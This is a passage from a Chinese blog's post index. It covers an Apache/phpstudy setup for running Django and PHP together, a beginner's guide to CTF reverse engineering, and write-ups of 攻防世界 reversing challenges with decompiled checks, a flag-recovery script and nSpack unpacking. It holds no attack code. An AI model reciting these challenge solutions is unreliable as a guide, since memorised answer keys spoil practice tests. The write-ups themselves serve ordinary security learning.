class="line">00BF311F | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]                             |</span><br><span class="line">00BF3122 | 83C0 08                  | add eax,8                                                |</span><br><span class="line">00BF3125 | 50                       | push eax                                                 |</span><br><span class="line">00BF3126 | 8B4D 0C                  | mov ecx,dword ptr ss:[ebp+C]                             | [ebp+C]:&amp;&quot;G:\\Users\\HP\\source\\repos\\f-young3.10_c\\Debug\\f-young3.10_c.exe&quot;</span><br><span class="line">00BF3129 | 51                       | push ecx                                                 |</span><br><span class="line">00BF312A | E8 70E0FFFF              | call f-young3.10_c.BF119F                                |</span><br><span class="line">00BF312F | 83C4 0C                  | add esp,C                                                |</span><br><span class="line">00BF3132 | 52                       | push edx                                                 | md5.c:52</span><br><span class="line">00BF3133 | 8BCD                     | mov ecx,ebp                                              |</span><br><span class="line">00BF3135 | 50                       | push eax                                                 |</span><br><span class="line">00BF3136 | 8D15 6431BF00            | lea edx,dword ptr ds:[BF3164]                            |</span><br><span class="line">00BF313C | E8 35E1FFFF              | call f-young3.10_c.BF1276                                |</span><br><span class="line">00BF3141 | 58                       | pop eax                                                  |</span><br><span class="line">00BF3142 | 5A                       | pop edx                                                  |</span><br><span class="line">00BF3143 | 5F                       | pop edi                                                  |</span><br><span class="line">00BF3144 | 5E                       | pop esi                                                  |</span><br><span class="line">00BF3145 | 5B                       | pop ebx                                                  |</span><br><span class="line">00BF3146 | 8B4D FC                  | mov ecx,dword ptr ss:[ebp-4]                             |</span><br><span class="line">00BF3149 | 33CD                     | xor ecx,ebp                                              |</span><br><span class="line">00BF314B | E8 B8E0FFFF              | call f-young3.10_c.BF1208                                |</span><br><span class="line">00BF3150 | 81C4 F0000000            | add esp,F0                                               |</span><br><span class="line">00BF3156 | 3BEC                     | cmp ebp,esp                                              |</span><br><span class="line">00BF3158 | E8 E7E0FFFF              | call f-young3.10_c.BF1244                                |</span><br><span class="line">00BF315D | 8BE5                     | mov esp,ebp                                              |</span><br><span class="line">00BF315F | 5D                       | pop ebp                                                  |</span><br><span class="line">00BF3160 | C3                       | ret                                                      |</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache配置Django和php共存</title>
      <link href="/p/833e13d.html"/>
      <url>/p/833e13d.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言："><a class="header-anchor" href="#前言："></a>前言：</h2><p>本来跑了个django网站，后来为了方便做web题又安装了PHP study，于是原本装的apache和phpstudy内置的apache服务冲突了，导致每回都要手动重启Apache。</p><p>干脆把原来装的Apache关掉，让Django和php用不同的端口解析。</p><h2 id="0x00-配置Django及其mod-wsgi"><a class="header-anchor" href="#0x00-配置Django及其mod-wsgi"></a>0x00 配置Django及其mod_wsgi</h2><h3 id="安装mod-wsgi"><a class="header-anchor" href="#安装mod-wsgi"></a><strong>安装mod_wsgi</strong></h3><ol><li><p>注意，因为apache是32位的，所以mod_wsgi也应该选择32位的。mod_wsgi的官网在这里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;code.google.com&#x2F;p&#x2F;modwsgi&#x2F;</span><br></pre></td></tr></table></figure><p>但是因为没有windows编译版本（自己编译几乎都是以失败告终），所幸在这里可以下载到编译版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.lfd.uci.edu&#x2F;~gohlke&#x2F;pythonlibs&#x2F;#mod_wsgi</span><br></pre></td></tr></table></figure><p>​这里选择</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod_wsgi-4.6.5+ap24vc14-cp36-cp36m-win32.whl</span><br></pre></td></tr></table></figure><p>将你下载的.whl 文件，放在一个目录中，我放在了 python的 \Scripts 文件夹中，然后 使用cmd cd命令到这个目录</p><a id="more"></a></li><li><p>使用pip 命令进行安装 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install mod_wsgi-4.6.4+ap24vc14-cp36-none-win_amd64.whl</span><br></pre></td></tr></table></figure><p>注意，现在目录一个在  python的 \Scripts 因为这东西安装完，你会发现在这个目录有一个 mod_wsgi-express.exe 的东西哦</p><p>安装完毕之后，执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod_wsgi-express module-config</span><br></pre></td></tr></table></figure></li></ol><p>命令执行完毕之后 你会得到以下内容</p><blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">LoadFile</span> <span class="string">"c:/users/administrator/appdata/local/programs/python/python36-32/python36.dll"</span></span><br><span class="line"><span class="string">LoadModule</span> <span class="string">wsgi_module</span> <span class="string">"c:/users/administrator/appdata/local/programs/python/python36-32/lib/site-packages/mod_wsgi/server/mod_wsgi.cp36-win32.pyd"</span></span><br><span class="line"><span class="string">WSGIPythonHome</span> <span class="string">"c:/users/administrator/appdata/local/programs/python/python36-32"</span></span><br></pre></td></tr></table></figure></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>把这三行目录加载到apache的配置文件当中，即httpd.conf文件中，相当于apache加载mod_wsgi模块，然后配置Django的相关路径即可将Django跑起来。</p><p>但是我们这里要配置php和Django共存，所以配置文件得改改。</p><h2 id="0x02-phpstudy配置"><a class="header-anchor" href="#0x02-phpstudy配置"></a>0x02 phpstudy配置</h2><p>phpstudy中新建两个网站：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568358365145.png" alt="1568358365145.png"></p><p>按php站设置默认即可，注意端口要不一样。</p><h2 id="0x03-修改Apache配置文件"><a class="header-anchor" href="#0x03-修改Apache配置文件"></a>0x03 修改Apache配置文件</h2><p>配置 D:\phpstudy_pro\Extensions\Apache2.4.39\conf\vhosts\127.0.0.1_8000.conf</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># 这一行要放在VirtualHost配置外面</span><br><span class="line">WSGIPythonHome "c:/users/hp/appdata/local/programs/python/python37"</span><br><span class="line"></span><br><span class="line"># 指定项目目录,即你的Django项目路径 </span><br><span class="line">WSGIPythonPath  D:/phpstudy_pro/WWW/django_web/django_app</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:8000</span>&gt;</span>                                                </span><br><span class="line">     ServerAdmin admin@amsilence.com                              </span><br><span class="line">     DocumentRoot "D:/phpstudy_pro/WWW/django_web"                               </span><br><span class="line">     # ServerName 127.0.0.1                                </span><br><span class="line">     # ErrorLog "/var/httpd/logs/www-error_log"                    </span><br><span class="line">     # CustomLog "/var/httpd/logs/www-access_log" common           </span><br><span class="line">     # Alias /html/ /var/www/server/html/                           </span><br><span class="line">                                                                  </span><br><span class="line">     # WSGIScriptAlias / /var/www/server/rplus/wsgi.py             </span><br><span class="line">     # WSGIPythonPath  /var/www/server </span><br><span class="line">     # 添加mod_wsgi.so模块,这三行是上面命令行中显示出来的</span><br><span class="line">     LoadFile "c:/users/hp/appdata/local/programs/python/python37/python37.dll"</span><br><span class="line">     LoadModule wsgi_module "c:/users/hp/appdata/local/programs/python/python37/lib/site-packages/mod_wsgi/server/mod_wsgi.cp37-win_amd64.pyd"</span><br><span class="line">     </span><br><span class="line">     # 指定项目的wsgi.py配置文件路径,这个py文件是在你的Django项目中  </span><br><span class="line">     WSGIScriptAlias / D:/phpstudy_pro/WWW/django_web/django_app/django_app/wsgi.py  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                            </span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span>                                                    </span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> <span class="attr">D:</span>/<span class="attr">phpstudy_pro</span>/<span class="attr">WWW</span>/<span class="attr">django_web</span>/<span class="attr">django_app</span>/<span class="attr">picture</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">Files</span> <span class="attr">wsgi.py</span>&gt;</span>  </span><br><span class="line">        Require all granted  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">Files</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"># 项目静态文件地址, Django项目中静态文件的路径  </span><br><span class="line">Alias /static D:/phpstudy_pro/WWW/django_web/django_app/socialdb/static</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> <span class="attr">D:</span>/<span class="attr">phpstudy_pro</span>/<span class="attr">WWW</span>/<span class="attr">django_web</span>/<span class="attr">django_app</span>/<span class="attr">socialdb</span>/<span class="attr">static</span>&gt;</span>  </span><br><span class="line">    AllowOverride None  </span><br><span class="line">    Options None  </span><br><span class="line">    Require all granted  </span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置 D:\phpstudy_pro\Extensions\Apache2.4.39\conf\vhosts\localhost_80.conf</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> <span class="attr">_default_:80</span>&gt;</span></span><br><span class="line">    DocumentRoot "D:/phpstudy_pro/WWW"</span><br><span class="line">    FcgidInitialEnv PHPRC "D:/phpstudy_pro/Extensions/php/php5.5.9nts"</span><br><span class="line">    AddHandler fcgid-script .php</span><br><span class="line">    FcgidWrapper "D:/phpstudy_pro/Extensions/php/php5.5.9nts/php-cgi.exe" .php</span><br><span class="line">  <span class="tag">&lt;<span class="name">Directory</span> "<span class="attr">D:</span>/<span class="attr">phpstudy_pro</span>/<span class="attr">WWW</span>"&gt;</span></span><br><span class="line">      Options FollowSymLinks ExecCGI</span><br><span class="line">      AllowOverride All</span><br><span class="line">      Order allow,deny</span><br><span class="line">      Allow from all</span><br><span class="line">      Require all granted</span><br><span class="line">  DirectoryIndex index.php</span><br><span class="line">  <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">  ErrorDocument 400 /error/400.html</span><br><span class="line">  ErrorDocument 403 /error/403.html</span><br><span class="line">  ErrorDocument 404 /error/404.html</span><br><span class="line">  ErrorDocument 500 /error/500.html</span><br><span class="line">  ErrorDocument 501 /error/501.html</span><br><span class="line">  ErrorDocument 502 /error/502.html</span><br><span class="line">  ErrorDocument 503 /error/503.html</span><br><span class="line">  ErrorDocument 504 /error/504.html</span><br><span class="line">  ErrorDocument 505 /error/505.html</span><br><span class="line">  ErrorDocument 506 /error/506.html</span><br><span class="line">  ErrorDocument 507 /error/507.html</span><br><span class="line">  ErrorDocument 510 /error/510.html</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure><p>正常情况下，phpstudy会在建立网站时自动配置http.conf，所以不需要修改http.conf的内容。</p><p>只要保证http.conf中vhosts相关文件引入了即可:</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568359583724.png" alt="1568359583724.png"></p><h2 id="0x04"><a class="header-anchor" href="#0x04"></a>0x04</h2><p>重启Apache服务。</p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache </tag>
            
            <tag> Django </tag>
            
            <tag> phpstudy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向入门参考</title>
      <link href="/p/f4951776.html"/>
      <url>/p/f4951776.html</url>
      
        <content type="html"><![CDATA[<h1>给萌新的逆向入门教程</h1><h2 id="0x00-事前BB"><a class="header-anchor" href="#0x00-事前BB"></a>0x00 事前BB</h2><p><code>pwn</code>和<code>逆向</code>可以说是CTF中比较难的方向了，<strong>但却是最不可或缺的一环</strong>。<br>说到这里就不得不说一下CTF中的鄙视链了：<br>分别是：<code>pwn-爷</code>、 <code>逆向-爹</code>、<code>web-狗</code>。</p><p>pwn和逆向有一定的共同点，但是毕竟咱也没人玩pwn啊，所以就随便写写逆向教程好了。</p><p>逆向的特点比较突出，那就是<code>入门难</code>，<code>起点高</code>，<code>学习曲线陡</code>。逆向在学习的过程中成就感并没有web那么突出，总体上的感觉就是枯燥，但是如果你喜欢那种一层层抽丝剥茧之后豁然开朗的感觉，那就开搞吧。</p><a id="more"></a><p>放一张之前培训的思维导图：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20191030153814041.png" alt="image-20191030153814041.png"></p><p>从这个图开始展开讲：</p><h2 id="0x01-开搞前最最最基础的知识"><a class="header-anchor" href="#0x01-开搞前最最最基础的知识"></a>0x01 开搞前最最最基础的知识</h2><h3 id="1-工具"><a class="header-anchor" href="#1-工具"></a>1. 工具</h3><table><thead><tr><th style="text-align:center">工具</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">ollyDbg、x64dbg (x32dbg)、Windbg</td><td style="text-align:center">动态调试</td></tr><tr><td style="text-align:center">IDA</td><td style="text-align:center">静态分析（也可以动态）</td></tr><tr><td style="text-align:center">PEID、ExeinfoPE、importRE</td><td style="text-align:center">PE文件分析，查壳相关工具</td></tr><tr><td style="text-align:center">dnSpy</td><td style="text-align:center">微软.NET逆向</td></tr><tr><td style="text-align:center">wireshark、fiddler</td><td style="text-align:center">网络分析、抓包工具</td></tr></tbody></table><p><code>linux</code>下还有<code>gdb</code>、<code>edb</code>等一系列好多好多……</p><p>这些工具在<code>吾爱破解</code>爱盘上都有: <code>https://down.52pojie.cn/</code></p><p><strong>以上工具每一类至少会一种，这是基本要求</strong>。</p><h3 id="2-coding-skill"><a class="header-anchor" href="#2-coding-skill"></a>2. coding skill</h3><p>不会写代码你 <s>玩什么逆向？</s>（打什么CTF？）</p><ul><li><p><code>C</code>/<code>C++</code>：（必会）静态分析的时候，反编译出来的（伪）代码就是c<ins>语法，所以不会c</ins>是玩不动的。基本上是个大学生都会学，但你们可以提前学，不仅可以在上课的时候装逼，还可以入门逆向。不说别的，要能看懂基本的逻辑，知道基本的概念和数据结构，<strong>会调试</strong>。</p></li><li><p><code>python</code>：（必会 ）IDA的各种脚本、逆向时处理各种算法的脚本、爆破/get flag的脚本、还有各种乱七八糟的脚本，都是python。</p></li><li><p><code>汇编</code>：（了解）基础阶段掌握一些常用的指令就好了，注意这里还要分不同的指令集，在分析mips或者其他平台时需要了解。</p></li></ul><h3 id="3-教程-书籍"><a class="header-anchor" href="#3-教程-书籍"></a>3. 教程/书籍</h3><p>书就是我发群里那些书，完全足够了，教程请关注看雪、吾爱、爱春秋等各种论坛。</p><p>做题平台这里推荐攻防世界、bugku，这里已经够你们玩的了，另外还有我们协会自己的攻防平台，后面应该会开放。</p><p>题库/平台使用方法：干就完事，从第一题开始刷起，无他，唯手熟尔。据说某大佬一年之内刷了7G的逆向题，想成为大佬么？动手吧。</p><h2 id="0x02-技能点顺序"><a class="header-anchor" href="#0x02-技能点顺序"></a>0x02 技能点顺序</h2><p>从易到难，先掌握上面列出来的最最最基础的技能（应该够你们忙活几个月的了）</p><p>然后更进一步了解</p><ul><li><p>加壳脱壳</p></li><li><p>加密解密</p></li><li><p>各种算法</p></li><li><p>调试与反调试</p><p>（只列举了脑壳里一瞬间反应出来的一些东西，其余的等到了那个阶段你也就不需要这个教程了）</p></li></ul><h2 id="0x03-关于CTF"><a class="header-anchor" href="#0x03-关于CTF"></a>0x03 关于CTF</h2><p>CTF是锻炼自己技能的最快途径，有机会就一定要参加，在打比赛的那几天你会过的特别充实，在那种精神高度集中的环境中你的成长也会飞快，同时要注意赛后总结，及时弥补自己的技能短板，这也会督促你去学习的。</p><p>当你大一的时候有了打比赛的意识，那你就超过了大多数人。</p><h2 id="0x04-一些建议"><a class="header-anchor" href="#0x04-一些建议"></a>0x04 一些建议</h2><p>最后再哔哔几句：</p><p><strong>几点建议：</strong></p><ul><li>保持谦虚</li><li>没了</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界re-writeup</title>
      <link href="/p/9e8c7ad8.html"/>
      <url>/p/9e8c7ad8.html</url>
      
        <content type="html"><![CDATA[<p>考研备考之余练练逆向，从ad-world进阶区刷起，每晚一道；</p><h1>re3 re2-cpp-is-awesome</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+4Fh] [rbp-21h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *a2;</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Usage: "</span>, a3);</span><br><span class="line">    v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v4, v3, v5);</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v6, <span class="string">" flag\n"</span>, v7);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v12, a2, a3);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v11, a2[<span class="number">1</span>], &amp;v12);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v12);</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">begin</span>(&amp;v11); ; sub_400D7A(&amp;i) )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">end</span>(&amp;v11);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_400D3D(&amp;i, &amp;v13) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v8 = (_BYTE *)sub_400D9A(&amp;i);</span><br><span class="line">    <span class="keyword">if</span> ( *v8 != off_6020A0[dword_6020C0[v14]] ) <span class="comment">// 关键点</span></span><br><span class="line">      sub_400B56();</span><br><span class="line">    ++v14;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_400B73();</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v11);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>dword_6020c0:</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568825865249.png" alt="1568825865249.png"></p><p>dump下来写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">off_6020a0 = <span class="string">"L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t"</span></span><br><span class="line"></span><br><span class="line">dword_6020c0 =  [<span class="number">0x24</span>, <span class="number">0x5</span>, <span class="number">0x36</span>, <span class="number">0x65</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, </span><br><span class="line">                 <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x2D</span>, <span class="number">0x1</span>, </span><br><span class="line">                 <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0D</span>, <span class="number">0x56</span>, </span><br><span class="line">                 <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x65</span>, <span class="number">0x3</span>, </span><br><span class="line">                 <span class="number">0x2D</span>, <span class="number">0x16</span>, <span class="number">0x2</span>, <span class="number">0x15</span>, </span><br><span class="line">                 <span class="number">0x3</span>, <span class="number">0x65</span>, <span class="number">0x0</span>, <span class="number">0x29</span>, </span><br><span class="line">                 <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x1</span>, <span class="number">0x44</span>, </span><br><span class="line">                 <span class="number">0x2B</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dword_6020c0:</span><br><span class="line">    s = s + str(off_6020a0[i])</span><br><span class="line"></span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>发现不对。注意到有个:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">align 8</span><br></pre></td></tr></table></figure><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568826064065.png" alt="1568826064065.png"></p><p>这里是“数据对齐”操作。</p><p>十六进制下打开可以看到：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568826136759.png" alt="1568826136759.png"></p><p>0x24和0x05之间插入了一个0x0，于是加回去，getflag：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568826359276.png" alt="1568826359276.png"></p><hr><h1>re4  crackme</h1><p>有壳 (nSpack)：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568910853160.png" alt="1568910853160.png"></p><p>直接上脱壳机：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568910949165.png" alt="1568910949165.png"></p><p>main函数代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Buf; <span class="comment">// [esp+4h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+5h] [ebp-37h]</span></span><br><span class="line"></span><br><span class="line">  Buf = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x31</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please Input Flag:"</span>);</span><br><span class="line">  gets_s(&amp;Buf, <span class="number">0x2C</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;Buf) == <span class="number">42</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;<span class="comment">// byte_402130 = "this_is_not_flag"</span></span><br><span class="line">    <span class="keyword">while</span> ( (*(&amp;Buf + v4) ^ byte_402130[v4 % <span class="number">16</span>]) == dword_402150[v4] ) </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 &gt;= <span class="number">42</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"right!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error!\n"</span>);</span><br><span class="line">LABEL_8:</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error!\n"</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  